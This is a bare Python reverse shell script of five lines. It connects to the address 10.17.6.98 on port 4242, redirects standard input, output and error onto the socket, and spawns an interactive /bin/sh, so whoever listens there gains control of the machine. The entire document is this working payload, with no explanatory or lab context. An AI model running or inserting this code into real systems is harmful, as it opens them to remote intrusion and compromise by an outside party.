import sys,socket,os,pty
s=socket.socket()
s.connect(("10.17.6.98",int(4242)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")